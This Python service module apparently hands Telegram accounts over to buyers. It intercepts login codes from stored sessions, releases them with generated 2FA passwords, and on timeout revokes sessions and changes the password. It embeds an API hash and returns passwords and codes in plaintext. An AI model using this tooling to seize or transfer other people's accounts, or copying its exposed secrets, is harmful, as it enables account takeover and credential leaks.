import time
import asyncio
import secrets
import string
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
from backend.models.database import (
    Account, DeliveryStatus, async_session, get_account, update_account, log_auth_action,
    save_incomplete_session, get_incomplete_session, delete_incomplete_session,
    cleanup_expired_incomplete_sessions, get_all_incomplete_sessions, IncompleteSession
)
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.telethon_client import get_telethon_manager
from backend.core_engine.logger import get_logger

logger = get_logger("DeliveryService")

CONFIRMATION_TIMEOUT_MINUTES = 15
API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


class DeliveryService:
    
    def __init__(self):
        self.active_monitors: Dict[str, asyncio.Task] = {}
    
    async def check_session_availability(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Checking session availability for {phone}")
        
        try:
            account = await get_account(phone)
            if not account:
                return {"status": "error", "error": "Account not found"}
            
            if not account.pyrogram_session and not account.telethon_session:
                return {"status": "error", "error": "No sessions available"}
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            
            try:
                if account.pyrogram_session:
                    connected = await pyrogram.connect_from_string(phone, account.pyrogram_session)
                    if connected:
                        await update_account(phone, delivery_status=DeliveryStatus.READY)
                        duration = time.time() - start_time
                        logger.info(f"Session READY for {phone} (duration: {duration:.2f}s)")
                        return {
                            "status": "success",
                            "delivery_status": "READY",
                            "has_2fa_password": account.generated_password is not None,
                            "duration": duration
                        }
            except Exception as e:
                logger.error(f"Pyrogram connection failed: {e}")
            
            return {"status": "error", "error": "Failed to connect to session"}
            
        except Exception as e:
            logger.error(f"Error checking session: {e}")
            return {"status": "error", "error": str(e)}
    
    async def request_code_ready(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"User marked code request ready for {phone}")
        
        try:
            account = await get_account(phone)
            if not account:
                return {"status": "error", "error": "Account not found"}
            
            await update_account(phone, delivery_status=DeliveryStatus.WAITING_CODE)
            await log_auth_action(phone, "delivery_waiting_code", "pending")
            
            duration = time.time() - start_time
            return {
                "status": "success",
                "message": "System is now waiting for code. Please request login code from Telegram.",
                "delivery_status": "WAITING_CODE",
                "duration": duration
            }
            
        except Exception as e:
            logger.error(f"Error in request_code_ready: {e}")
            return {"status": "error", "error": str(e)}
    
    async def get_received_code(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Fetching received code for {phone}")
        
        try:
            account = await get_account(phone)
            if not account:
                return {"status": "error", "error": "Account not found"}
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            
            code = await pyrogram.get_last_telegram_code(phone)
            
            if not code:
                return {
                    "status": "waiting",
                    "message": "No code received yet. Please request code from Telegram app."
                }
            
            deadline = datetime.utcnow() + timedelta(minutes=CONFIRMATION_TIMEOUT_MINUTES)
            
            await update_account(
                phone,
                delivery_status=DeliveryStatus.CODE_SENT,
                last_code=code,
                code_sent_at=datetime.utcnow(),
                confirmation_deadline=deadline
            )
            
            self._start_timeout_monitor(phone)
            
            await log_auth_action(phone, "delivery_code_sent", "success", f"Code: {code[:2]}***")
            
            duration = time.time() - start_time
            logger.info(f"Code delivered for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "code": code,
                "password": account.generated_password,
                "delivery_status": "CODE_SENT",
                "confirmation_deadline": deadline.isoformat(),
                "timeout_minutes": CONFIRMATION_TIMEOUT_MINUTES,
                "duration": duration
            }
            
        except Exception as e:
            logger.error(f"Error getting code: {e}")
            return {"status": "error", "error": str(e)}
    
    async def confirm_delivery(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Final confirmation received for {phone}")
        
        try:
            account = await get_account(phone)
            if not account:
                return {"status": "error", "error": "Account not found"}
            
            if account.delivery_status != DeliveryStatus.CODE_SENT:
                return {"status": "error", "error": "Invalid state for confirmation"}
            
            self._stop_timeout_monitor(phone)
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            telethon = get_telethon_manager(API_ID, API_HASH)
            
            logout_results = []
            
            if phone not in pyrogram.active_clients and account.pyrogram_session:
                try:
                    await pyrogram.connect_from_string(phone, account.pyrogram_session)
                    logger.info(f"Pyrogram session loaded from DB for {phone}")
                except Exception as e:
                    logger.error(f"Failed to load Pyrogram session: {e}")
            
            if phone not in telethon.active_clients and account.telethon_session:
                try:
                    await telethon.connect_from_string(phone, account.telethon_session)
                    logger.info(f"Telethon session loaded from DB for {phone}")
                except Exception as e:
                    logger.error(f"Failed to load Telethon session: {e}")
            
            try:
                if phone in pyrogram.active_clients:
                    await pyrogram.active_clients[phone].log_out()
                    del pyrogram.active_clients[phone]
                    logout_results.append("Pyrogram logged out")
                    logger.info(f"Pyrogram session logged out for {phone}")
                elif account.pyrogram_session:
                    logout_results.append("Pyrogram session exists but couldn't connect")
            except Exception as e:
                logger.error(f"Pyrogram logout error: {e}")
                logout_results.append(f"Pyrogram logout failed: {e}")
            
            try:
                if phone in telethon.active_clients:
                    await telethon.active_clients[phone].log_out()
                    del telethon.active_clients[phone]
                    logout_results.append("Telethon logged out")
                    logger.info(f"Telethon session logged out for {phone}")
                elif account.telethon_session:
                    logout_results.append("Telethon session exists but couldn't connect")
            except Exception as e:
                logger.error(f"Telethon logout error: {e}")
                logout_results.append(f"Telethon logout failed: {e}")
            
            await update_account(
                phone,
                delivery_status=DeliveryStatus.DELIVERED,
                delivered_at=datetime.utcnow(),
                pyrogram_session=None,
                telethon_session=None,
                last_code=None,
                generated_password=None
            )
            
            await log_auth_action(phone, "delivery_confirmed", "success", "; ".join(logout_results))
            
            duration = time.time() - start_time
            logger.info(f"Delivery confirmed and sessions cleared for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Delivery confirmed. All sessions have been logged out and deleted.",
                "delivery_status": "DELIVERED",
                "logout_results": logout_results,
                "duration": duration
            }
            
        except Exception as e:
            logger.error(f"Error confirming delivery: {e}")
            return {"status": "error", "error": str(e)}
    
    async def force_secure_account(self, phone: str, reason: str = "timeout") -> Dict[str, Any]:
        start_time = time.time()
        logger.warning(f"FORCE SECURING account {phone}. Reason: {reason}")
        
        try:
            account = await get_account(phone)
            if not account:
                return {"status": "error", "error": "Account not found"}
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            
            new_password = self._generate_strong_password(24)
            
            try:
                await pyrogram.change_2fa_password(phone, account.generated_password, new_password)
                logger.info(f"2FA password changed for {phone}")
            except Exception as e:
                logger.error(f"Failed to change 2FA: {e}")
            
            try:
                await pyrogram.terminate_other_sessions(phone)
                logger.info(f"Other sessions terminated for {phone}")
            except Exception as e:
                logger.error(f"Failed to terminate sessions: {e}")
            
            await update_account(
                phone,
                delivery_status=DeliveryStatus.FORCE_SECURED,
                generated_password=new_password
            )
            
            await log_auth_action(phone, "force_secured", "success", f"Reason: {reason}")
            
            duration = time.time() - start_time
            logger.warning(f"Account {phone} FORCE SECURED (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Account force secured. 2FA changed and sessions revoked.",
                "delivery_status": "FORCE_SECURED",
                "reason": reason,
                "duration": duration
            }
            
        except Exception as e:
            logger.error(f"Error force securing: {e}")
            return {"status": "error", "error": str(e)}
    
    def _start_timeout_monitor(self, phone: str):
        if phone in self.active_monitors:
            self.active_monitors[phone].cancel()
        
        task = asyncio.create_task(self._timeout_monitor(phone))
        self.active_monitors[phone] = task
        logger.info(f"Started timeout monitor for {phone}")
    
    def _stop_timeout_monitor(self, phone: str):
        if phone in self.active_monitors:
            self.active_monitors[phone].cancel()
            del self.active_monitors[phone]
            logger.info(f"Stopped timeout monitor for {phone}")
    
    async def _timeout_monitor(self, phone: str):
        try:
            await asyncio.sleep(CONFIRMATION_TIMEOUT_MINUTES * 60)
            
            account = await get_account(phone)
            if not account or account.delivery_status != DeliveryStatus.CODE_SENT:
                return
            
            logger.warning(f"Timeout reached for {phone}. Checking for new sessions...")
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            security_info = await pyrogram.get_security_info(phone)
            
            if security_info.get("other_sessions_count", 0) > 0:
                logger.warning(f"New session detected for {phone}! Force securing...")
                await self.force_secure_account(phone, "timeout_with_new_session")
            else:
                await save_incomplete_session(
                    phone=phone,
                    step="timeout_no_confirmation",
                    pyrogram_session=account.pyrogram_session,
                    telethon_session=account.telethon_session,
                    generated_password=account.generated_password,
                    last_code=account.last_code,
                    error_message="Timeout without confirmation"
                )
                
                await self._cleanup_from_ram(phone)
                
                await update_account(phone, delivery_status=DeliveryStatus.EXPIRED)
                await log_auth_action(phone, "delivery_expired", "warning", "Timeout - saved to incomplete sessions")
                logger.warning(f"Delivery expired for {phone}. Saved to incomplete sessions and cleaned from RAM.")
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Error in timeout monitor: {e}")
        finally:
            if phone in self.active_monitors:
                del self.active_monitors[phone]
    
    async def _cleanup_from_ram(self, phone: str):
        pyrogram = get_session_manager(API_ID, API_HASH)
        telethon = get_telethon_manager(API_ID, API_HASH)
        
        try:
            if phone in pyrogram.active_clients:
                await pyrogram.active_clients[phone].disconnect()
                del pyrogram.active_clients[phone]
                logger.info(f"Pyrogram client cleaned from RAM for {phone}")
        except Exception as e:
            logger.error(f"Error cleaning Pyrogram from RAM: {e}")
        
        try:
            if phone in telethon.active_clients:
                await telethon.active_clients[phone].disconnect()
                del telethon.active_clients[phone]
                logger.info(f"Telethon client cleaned from RAM for {phone}")
        except Exception as e:
            logger.error(f"Error cleaning Telethon from RAM: {e}")
    
    def _generate_strong_password(self, length: int = 20) -> str:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        return ''.join(secrets.choice(alphabet) for _ in range(length))
    
    async def get_all_accounts(self) -> List[Dict[str, Any]]:
        from sqlalchemy import select
        
        async with async_session() as session:
            result = await session.execute(select(Account))
            accounts = result.scalars().all()
            
            return [
                {
                    "id": acc.id,
                    "phone": acc.phone,
                    "telegram_id": acc.telegram_id,
                    "first_name": acc.first_name,
                    "status": acc.status.value if acc.status else None,
                    "delivery_status": acc.delivery_status.value if acc.delivery_status else None,
                    "has_pyrogram": acc.pyrogram_session is not None,
                    "has_telethon": acc.telethon_session is not None,
                    "has_2fa": acc.has_2fa,
                    "has_password": acc.generated_password is not None,
                    "password": acc.generated_password,
                    "last_code": acc.last_code,
                    "confirmation_deadline": acc.confirmation_deadline.isoformat() if acc.confirmation_deadline else None,
                    "created_at": acc.created_at.isoformat() if acc.created_at else None,
                    "delivered_at": acc.delivered_at.isoformat() if acc.delivered_at else None
                }
                for acc in accounts
            ]
    
    async def get_security_logs(self, phone: str = None, limit: int = 100) -> List[Dict[str, Any]]:
        from sqlalchemy import select, desc
        from backend.models.database import AuthLog
        
        async with async_session() as session:
            query = select(AuthLog).order_by(desc(AuthLog.created_at)).limit(limit)
            if phone:
                query = query.where(AuthLog.phone == phone)
            
            result = await session.execute(query)
            logs = result.scalars().all()
            
            return [
                {
                    "id": log.id,
                    "phone": log.phone,
                    "action": log.action,
                    "status": log.status,
                    "details": log.details,
                    "created_at": log.created_at.isoformat() if log.created_at else None
                }
                for log in logs
            ]
    
    async def delete_account(self, phone: str) -> Dict[str, Any]:
        from sqlalchemy import delete
        
        try:
            self._stop_timeout_monitor(phone)
            
            pyrogram = get_session_manager(API_ID, API_HASH)
            telethon = get_telethon_manager(API_ID, API_HASH)
            
            try:
                if phone in pyrogram.active_clients:
                    await pyrogram.active_clients[phone].log_out()
            except:
                pass
            
            try:
                if phone in telethon.active_clients:
                    await telethon.active_clients[phone].log_out()
            except:
                pass
            
            async with async_session() as session:
                await session.execute(delete(Account).where(Account.phone == phone))
                await session.commit()
            
            await delete_incomplete_session(phone)
            
            await log_auth_action(phone, "account_deleted", "success")
            logger.info(f"Account {phone} deleted")
            
            return {"status": "success", "message": "Account deleted"}
            
        except Exception as e:
            logger.error(f"Error deleting account: {e}")
            return {"status": "error", "error": str(e)}
    
    async def get_incomplete_sessions_list(self) -> List[Dict[str, Any]]:
        try:
            sessions = await get_all_incomplete_sessions()
            return [
                {
                    "id": s.id,
                    "phone": s.phone,
                    "step": s.step,
                    "has_pyrogram": s.pyrogram_session is not None,
                    "has_telethon": s.telethon_session is not None,
                    "has_password": s.generated_password is not None,
                    "last_code": s.last_code,
                    "error_message": s.error_message,
                    "created_at": s.created_at.isoformat() if s.created_at else None,
                    "expires_at": s.expires_at.isoformat() if s.expires_at else None
                }
                for s in sessions
            ]
        except Exception as e:
            logger.error(f"Error getting incomplete sessions: {e}")
            return []
    
    async def cleanup_expired(self) -> Dict[str, Any]:
        try:
            await cleanup_expired_incomplete_sessions()
            logger.info("Expired incomplete sessions cleaned up")
            return {"status": "success", "message": "Expired sessions cleaned up"}
        except Exception as e:
            logger.error(f"Error cleaning up expired sessions: {e}")
            return {"status": "error", "error": str(e)}


_delivery_service: Optional[DeliveryService] = None

def get_delivery_service() -> DeliveryService:
    global _delivery_service
    if _delivery_service is None:
        _delivery_service = DeliveryService()
    return _delivery_service
